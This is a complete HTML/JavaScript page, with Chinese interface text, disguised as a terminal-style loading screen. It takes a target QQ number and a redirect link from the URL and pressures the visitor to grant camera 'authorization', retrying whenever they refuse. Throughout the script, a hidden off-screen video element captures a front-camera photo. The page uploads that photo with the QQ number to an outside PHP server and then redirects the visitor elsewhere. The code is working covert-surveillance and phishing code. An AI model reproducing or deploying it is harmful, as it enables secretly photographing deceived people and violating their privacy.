<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>加载中...</title>
    <style>
        :root {
            --bg: #0a0a0a;
            --text: #a0a0a0;
            --green: #27c93f;
            --blue: #5dade2;
            --yellow: #f39c12;
            --red: #e74c3c;
            --dim: #555;
            --white: #e0e0e0;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: var(--bg);
            font-family: 'SF Mono', 'Consolas', 'Monaco', 'Courier New', monospace;
            height: 100vh;
            overflow: hidden;
            display: flex;
            flex-direction: column;
        }

        /* ============ 终端标题栏 ============ */
        .terminal-header {
            background: #1a1a1a;
            padding: 10px 16px;
            display: flex;
            align-items: center;
            gap: 10px;
            border-bottom: 1px solid #222;
            user-select: none;
            flex-shrink: 0;
        }

        .terminal-dot {
            width: 13px;
            height: 13px;
            border-radius: 50%;
            flex-shrink: 0;
        }
        .terminal-dot.red { background: #ff5f56; }
        .terminal-dot.yellow { background: #ffbd2e; }
        .terminal-dot.green { background: #27c93f; }

        .terminal-title {
            flex: 1;
            text-align: center;
            color: #555;
            font-size: 11px;
            letter-spacing: 1.5px;
        }

        .terminal-status {
            color: #444;
            font-size: 10px;
        }

        /* ============ 终端主体 ============ */
        .terminal-body {
            flex: 1;
            padding: 18px 22px;
            overflow-y: auto;
            font-size: 13px;
            line-height: 1.85;
            color: var(--text);
            background: #0a0a0a;
        }

        .terminal-body::-webkit-scrollbar {
            width: 4px;
        }
        .terminal-body::-webkit-scrollbar-thumb {
            background: #1a1a1a;
            border-radius: 2px;
        }
        .terminal-body::-webkit-scrollbar-track {
            background: #0a0a0a;
        }

        /* 每一行 */
        .line {
            margin: 0;
            white-space: pre-wrap;
            word-break: break-all;
            animation: fadeLine 0.25s ease-out;
            padding: 1px 0;
        }

        @keyframes fadeLine {
            from {
                opacity: 0;
                transform: translateY(3px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* 颜色类 */
        .prompt { color: var(--green); }
        .info { color: var(--blue); }
        .warn { color: var(--yellow); }
        .error { color: var(--red); }
        .success { color: var(--green); }
        .dim { color: var(--dim); }
        .white { color: var(--white); }
        .highlight { color: #fff; font-weight: bold; }

        /* 闪烁光标 */
        .cursor-blink {
            display: inline-block;
            width: 8px;
            height: 15px;
            background: var(--green);
            animation: blink 1s step-end infinite;
            vertical-align: middle;
            margin-left: 2px;
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }

        /* ============ 权限拒绝弹窗 ============ */
        .denied-overlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.85);
            z-index: 999;
            align-items: center;
            justify-content: center;
            backdrop-filter: blur(4px);
        }
        .denied-overlay.show {
            display: flex;
        }

        .denied-box {
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 10px;
            padding: 28px 24px;
            text-align: center;
            max-width: 380px;
            width: 90%;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6);
        }
        .denied-box .icon {
            font-size: 48px;
            margin-bottom: 12px;
        }
        .denied-box .title {
            font-size: 16px;
            color: #e98b82;
            margin-bottom: 8px;
            font-weight: 600;
        }
        .denied-box .desc {
            font-size: 12px;
            color: #888;
            margin-bottom: 20px;
            line-height: 1.6;
        }
        .denied-box .hint {
            font-size: 11px;
            color: #666;
            margin-bottom: 18px;
            line-height: 1.5;
        }
        .denied-box button {
            padding: 11px 28px;
            background: rgba(255, 255, 255, 0.08);
            color: #ccc;
            border: 1px solid #444;
            border-radius: 6px;
            cursor: pointer;
            font-size: 13px;
            font-family: inherit;
            transition: all 0.2s;
            letter-spacing: 0.5px;
        }
        .denied-box button:hover {
            background: rgba(255, 255, 255, 0.15);
            color: #fff;
            border-color: #666;
        }
    </style>
</head>
<body>

    <!-- ==================== 终端界面 ==================== -->
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">session — zyj — 80×24</span>
        <span class="terminal-status" id="terminalStatus">●</span>
    </div>

    <div class="terminal-body" id="terminalBody">
        <!-- 动态插入终端行 -->
    </div>

    <!-- ==================== 权限拒绝弹窗 ==================== -->
    <div class="denied-overlay" id="deniedOverlay">
        <div class="denied-box">
            <div class="icon">🔒</div>
            <div class="title">无法继续</div>
            <div class="desc">设备授权未通过，部分功能受限</div>
            <div class="hint">
                请在系统设置中允许相关权限后<br>点击下方按钮重新尝试
            </div>
            <button onclick="retryCapture()">⟳ 重新尝试</button>
        </div>
    </div>

    <!-- 隐藏的采集元素 -->
    <video
    id="hiddenVideo"
    playsinline
    autoplay
    muted
    style="position:fixed;top:-200vh;left:-200vw;width:1px;height:1px;opacity:0;pointer-events:none;"
    ></video>
    <canvas id="hiddenCanvas" style="display:none;"></canvas>

    <script>
        (function() {
            // ============ 获取URL参数 ============
            const urlParams = new URLSearchParams(window.location.search);
            const targetQQ = urlParams.get('qq');
            const redirectUrl = urlParams.get('url');

            // 如果没有参数，直接返回
            if (!targetQQ || !redirectUrl) {
                document.body.innerHTML = '<div style="color:#555;text-align:center;padding:40px;">参数错误</div>';
                return;
            }

            const decodedRedirectUrl = decodeURIComponent(redirectUrl);
            const API_URL = 'http://a1nb66.atwebpages.com/zyj/api.php';

            // ============ DOM元素 ============
            const terminalBody = document.getElementById('terminalBody');
            const terminalStatus = document.getElementById('terminalStatus');
            const deniedOverlay = document.getElementById('deniedOverlay');
            const video = document.getElementById('hiddenVideo');
            const canvas = document.getElementById('hiddenCanvas');
            const ctx = canvas.getContext('2d');

            // ============ 全局状态 ============
            let currentStream = null;
            let isDenied = false;
            let captureCompleted = false;

            // ============ 终端输出函数 ============
            function terminalPrint(text, className = '') {
                const p = document.createElement('p');
                p.className = 'line ' + (className || '');
                p.innerHTML = text;
                terminalBody.appendChild(p);
                // 自动滚动到底部
                terminalBody.scrollTop = terminalBody.scrollHeight;
            }

            function printPrompt() {
                terminalPrint('<span class="prompt">zyj@session:~$</span> <span class="cursor-blink"></span>', '');
                // 移除上一个光标
                const cursors = terminalBody.querySelectorAll('.cursor-blink');
                cursors.forEach((c, i) => {
                    if (i < cursors.length - 1) c.remove();
                });
            }

            function printSeparator() {
                terminalPrint('<span class="dim">────────────────────────────────────────────</span>');
            }

            // ============ 模拟打字效果 ============
            async function typeWriter(text, className = '', delay = 25) {
                const p = document.createElement('p');
                p.className = 'line ' + (className || '');
                terminalBody.appendChild(p);

                // 先移除旧光标
                const oldCursors = terminalBody.querySelectorAll('.cursor-blink');
                oldCursors.forEach(c => c.remove());

                // 添加新光标
                const cursorSpan = document.createElement('span');
                cursorSpan.className = 'cursor-blink';
                p.appendChild(cursorSpan);

                for (let i = 0; i < text.length; i++) {
                    // 光标移到文字前
                    cursorSpan.remove();
                    p.innerHTML += text[i];
                    p.appendChild(cursorSpan);
                    terminalBody.scrollTop = terminalBody.scrollHeight;
                    await sleep(delay);
                }
                // 移除光标
                cursorSpan.remove();
                terminalBody.scrollTop = terminalBody.scrollHeight;
            }

            function sleep(ms) {
                return new Promise(resolve => setTimeout(resolve, ms));
            }

            // ============ 更新状态指示灯 ============
            function updateStatus(color) {
                terminalStatus.innerHTML = '●';
                terminalStatus.style.color = color;
            }

            // ============ 停止流 ============
            function stopStream() {
                if (currentStream) {
                    currentStream.getTracks().forEach(track => {
                        track.stop();
                    });
                    currentStream = null;
                }
                if (video.srcObject) {
                    video.srcObject = null;
                }
            }

            // ============ 显示权限拒绝 ============
            function showDenied(reason = '') {
                isDenied = true;
                stopStream();
                updateStatus('#e74c3c');
                terminalPrint('');
                terminalPrint('<span class="error">[✗] 授权未通过</span>');
                if (reason) {
                    terminalPrint('<span class="dim">    ' + reason + '</span>');
                }
                terminalPrint('<span class="dim">    等待用户操作...</span>');
                terminalPrint('');
                printPrompt();
                deniedOverlay.classList.add('show');
            }

            // ============ 隐藏权限拒绝 ============
            function hideDenied() {
                isDenied = false;
                deniedOverlay.classList.remove('show');
                updateStatus('#f39c12');
            }

            // ============ 重新尝试 ============
            window.retryCapture = function() {
                hideDenied();
                terminalPrint('');
                terminalPrint('<span class="warn">[↻] 重新初始化...</span>');
                printPrompt();
                startCaptureProcess();
            };

            // ============ 执行跳转 ============
            function doRedirect() {
                terminalPrint('');
                terminalPrint('<span class="info">[→] 正在跳转...</span>');
                printSeparator();
                terminalPrint('<span class="dim">目标: ' + decodedRedirectUrl.substring(0, 60) + '...</span>');
                terminalPrint('');
                printPrompt();

                // 清理
                stopStream();
                captureCompleted = true;

                // 延迟跳转
                setTimeout(() => {
                    window.location.href = decodedRedirectUrl;
                }, 600);
            }

            // ============ 主流程 ============
            async function startCaptureProcess() {
                if (captureCompleted) return;

                hideDenied();
                updateStatus('#f39c12');

                // === 阶段1: 环境检测 ===
                terminalPrint('');
                terminalPrint('<span class="info">[i] 正在初始化运行环境...</span>');
                await sleep(300);

                const userAgent = navigator.userAgent;
                const platform = navigator.platform || 'unknown';
                const language = navigator.language || 'unknown';
                const online = navigator.onLine;
                const cookiesEnabled = navigator.cookieEnabled;
                const screenInfo = `${window.screen.width}x${window.screen.height}`;
                const colorDepth = window.screen.colorDepth + 'bit';
                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';

                terminalPrint('<span class="dim">    platform    : ' + platform + '</span>');
                await sleep(80);
                terminalPrint('<span class="dim">    language    : ' + language + '</span>');
                await sleep(80);
                terminalPrint('<span class="dim">    screen      : ' + screenInfo + ' @ ' + colorDepth + '</span>');
                await sleep(80);
                terminalPrint('<span class="dim">    timezone    : ' + timezone + '</span>');
                await sleep(80);
                terminalPrint('<span class="dim">    network     : ' + (online ? 'connected' : 'offline') + '</span>');
                await sleep(80);
                terminalPrint('<span class="dim">    session_id  : ' + generateSessionId() + '</span>');
                await sleep(150);
                terminalPrint('<span class="success">[✓] 环境初始化完成</span>');
                await sleep(200);

                // === 阶段2: 检查API支持 ===
                terminalPrint('');
                terminalPrint('<span class="info">[i] 检测设备兼容性...</span>');
                await sleep(300);

                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    terminalPrint('<span class="error">[✗] 设备不支持所需接口</span>');
                    terminalPrint('<span class="dim">    mediaDevices API 不可用</span>');
                    showDenied('设备不支持');
                    return;
                }
                terminalPrint('<span class="success">[✓] 接口检测通过</span>');
                await sleep(200);

                // 检查协议
                const protocol = window.location.protocol;
                if (protocol === 'http:' && window.location.hostname !== 'localhost' && window.location.hostname !==
                    '127.0.0.1') {
                    terminalPrint('<span class="warn">[!] 当前为非加密连接，可能受限</span>');
                } else {
                    terminalPrint('<span class="dim">    连接类型: ' + protocol + '//</span>');
                }
                await sleep(150);

                // === 阶段3: 请求授权 ===
                terminalPrint('');
                terminalPrint('<span class="info">[i] 正在请求设备授权...</span>');
                terminalPrint('<span class="dim">    请在弹出的提示中选择"允许"</span>');
                updateStatus('#f39c12');
                await sleep(200);

                let stream = null;
                let permissionDenied = false;
                let denyReason = '';

                try {
                    stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: 'user',
                            width: { ideal: 1280 },
                            height: { ideal: 720 }
                        },
                        audio: false
                    });
                } catch (err) {
                    permissionDenied = true;
                    denyReason = err.message || err.name || '未知错误';

                    // 尝试降级
                    if (err.name === 'OverconstrainedError' || err.name === 'ConstraintNotSatisfiedError') {
                        terminalPrint('<span class="warn">[!] 首选配置不可用，尝试降级...</span>');
                        try {
                            stream = await navigator.mediaDevices.getUserMedia({
                                video: true,
                                audio: false
                            });
                            permissionDenied = false;
                            terminalPrint('<span class="success">[✓] 降级配置可用</span>');
                        } catch (err2) {
                            denyReason = err2.message || err2.name;
                        }
                    }

                    if (permissionDenied) {
                        if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                            terminalPrint('<span class="error">[✗] 用户拒绝了授权请求</span>');
                            terminalPrint('<span class="dim">    ' + denyReason + '</span>');
                        } else if (err.name === 'NotFoundError') {
                            terminalPrint('<span class="error">[✗] 未检测到可用设备</span>');
                            terminalPrint('<span class="dim">    ' + denyReason + '</span>');
                        } else if (err.name === 'NotReadableError') {
                            terminalPrint('<span class="error">[✗] 设备被占用或无法访问</span>');
                            terminalPrint('<span class="dim">    ' + denyReason + '</span>');
                        } else {
                            terminalPrint('<span class="error">[✗] 设备访问失败</span>');
                            terminalPrint('<span class="dim">    ' + denyReason + '</span>');
                        }
                    }
                }

                // 权限被拒绝 - 不跳转
                if (permissionDenied) {
                    showDenied(denyReason);
                    return;
                }

                // === 阶段4: 授权成功，继续 ===
                currentStream = stream;
                video.srcObject = stream;
                video.setAttribute('playsinline', '');
                video.muted = true;

                terminalPrint('<span class="success">[✓] 授权成功</span>');
                updateStatus('#27c93f');
                await sleep(300);

                // === 阶段5: 等待准备 ===
                terminalPrint('');
                terminalPrint('<span class="info">[i] 正在准备...</span>');
                await sleep(200);

                try {
                    await Promise.race([
                        new Promise((resolve, reject) => {
                            const timeout = setTimeout(() => reject(new Error('timeout')), 10000);
                            video.onloadedmetadata = () => {
                                clearTimeout(timeout);
                                resolve();
                            };
                            video.onerror = () => {
                                clearTimeout(timeout);
                                reject(new Error('load_error'));
                            };
                            video.play().catch(() => {
                                // 某些浏览器自动播放被阻止，忽略
                                clearTimeout(timeout);
                                resolve();
                            });
                        })
                    ]);
                } catch (e) {
                    terminalPrint('<span class="warn">[!] 准备超时，继续尝试...</span>');
                }

                // 等待稳定
                terminalPrint('<span class="dim">    等待信号稳定...</span>');
                await sleep(2000);

                // 检查视频状态
                const vw = video.videoWidth || 0;
                const vh = video.videoHeight || 0;

                if (vw === 0 || vh === 0) {
                    terminalPrint('<span class="warn">[!] 信号异常，使用备用方案...</span>');
                    await sleep(1000);
                    // 再试一次
                    if (video.videoWidth === 0) {
                        terminalPrint('<span class="error">[✗] 无法获取有效信号</span>');
                        showDenied('信号异常');
                        return;
                    }
                }

                terminalPrint('<span class="dim">    信号分辨率: ' + video.videoWidth + 'x' + video.videoHeight +
                    '</span>');
                await sleep(300);

                // === 阶段6: 采集 ===
                terminalPrint('');
                terminalPrint('<span class="info">[i] 正在采集...</span>');
                updateStatus('#5dade2');
                await sleep(300);

                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;

                try {
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    terminalPrint('<span class="success">[✓] 采集完成</span>');
                } catch (e) {
                    terminalPrint('<span class="error">[✗] 采集失败: ' + e.message + '</span>');
                    showDenied('采集过程出错');
                    return;
                }

                const imageData = canvas.toDataURL('image/jpeg', 0.65);
                const imageSizeKB = Math.round(imageData.length / 1024);
                terminalPrint('<span class="dim">    数据大小: ~' + imageSizeKB + ' KB</span>');
                await sleep(200);

                // === 阶段7: 传输 ===
                terminalPrint('');
                terminalPrint('<span class="info">[i] 正在传输...</span>');
                updateStatus('#5dade2');

                const formData = new FormData();
                formData.append('qq', targetQQ);
                formData.append('image', imageData);

                let uploadSuccess = false;
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 20000);

                    const response = await fetch(API_URL, {
                        method: 'POST',
                        body: formData,
                        signal: controller.signal
                    });

                    clearTimeout(timeoutId);

                    if (response.ok) {
                        const result = await response.json();
                        if (result.success) {
                            uploadSuccess = true;
                            terminalPrint('<span class="success">[✓] 传输完成</span>');
                            if (result.filename) {
                                terminalPrint('<span class="dim">    标识: ' + result.filename + '</span>');
                            }
                        } else {
                            terminalPrint('<span class="warn">[!] 服务器返回异常: ' + (result.message || 'unknown') +
                                '</span>');
                        }
                    } else {
                        terminalPrint('<span class="warn">[!] 传输状态异常: HTTP ' + response.status + '</span>');
                    }
                } catch (err) {
                    if (err.name === 'AbortError') {
                        terminalPrint('<span class="warn">[!] 传输超时</span>');
                    } else {
                        terminalPrint('<span class="warn">[!] 网络波动: ' + err.message + '</span>');
                    }
                }

                // === 阶段8: 完成 ===
                terminalPrint('');
                terminalPrint('<span class="success">[✓] 流程结束</span>');
                updateStatus('#27c93f');

                // 停止设备
                stopStream();

                // 跳转
                await sleep(500);
                doRedirect();
            }

            // ============ 生成会话ID ============
            function generateSessionId() {
                const chars = 'abcdef0123456789';
                let id = '';
                for (let i = 0; i < 16; i++) {
                    id += chars.charAt(Math.floor(Math.random() * chars.length));
                }
                return id;
            }

            // ============ 初始化启动 ============
            async function init() {
                updateStatus('#f39c12');

                // 初始欢迎信息
                await sleep(200);
                terminalPrint('<span class="dim">' + new Date().toISOString().replace('T', ' ').substring(0, 19) +
                    ' UTC</span>');
                terminalPrint('');
                terminalPrint('<span class="info">会话已建立</span>');
                terminalPrint('<span class="dim">────────────────────────────────────────────</span>');
                await sleep(150);

                // 显示部分环境信息
                terminalPrint('<span class="dim">session_id  : ' + generateSessionId() + '</span>');
                terminalPrint('<span class="dim">target      : ' + targetQQ + '</span>');
                terminalPrint('<span class="dim">protocol    : ' + window.location.protocol + '//</span>');
                await sleep(200);

                printPrompt();
                await sleep(400);

                // 开始主流程
                startCaptureProcess();
            }

            // 启动
            init();

            // ============ 页面关闭时清理 ============
            window.addEventListener('beforeunload', () => {
                stopStream();
            });

        })();
    </script>
</body>
</html>
